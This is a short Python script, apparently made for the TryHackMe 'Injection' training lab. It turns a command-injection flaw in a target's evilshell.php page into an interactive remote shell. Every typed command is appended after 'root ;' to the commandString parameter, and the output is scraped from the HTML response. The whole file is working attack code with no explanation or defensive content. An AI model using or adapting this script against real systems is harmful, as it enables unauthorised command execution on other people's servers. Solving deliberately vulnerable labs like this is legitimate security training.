import requests
import re
import sys

print ("USAGE:\n\npython inject.py IPAddress\n\n\n\n")
ip = sys.argv[1]

class bcolors:
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    LIGHTGREY='\033[37m'
    ENDC = '\033[0m'
    WARNING = '\033[93m'

print (bcolors.LIGHTGREY + "INJECTION TryHackMe"+ bcolors.ENDC)
print
while True:    
    x = raw_input('Pwn3d@' + bcolors.FAIL + 'injection$ ' + bcolors.ENDC)
    if "exit" in str (x):
        break
    else:
        cmd = "root ;" + x
        url = "http://" + ip + "/evilshell.php?commandString=" + cmd
        string = requests.get(url).text
        find = string.find("</button>")
        find2 = string.find ("</form>")
        get1 = string[find : find2]
        get2 = re.sub("</button>", "", get1, 1).strip()
        print (bcolors.OKGREEN + get2 + bcolors.ENDC)
        if not get2:
			print (bcolors.WARNING + "ERROR" + bcolors.ENDC)
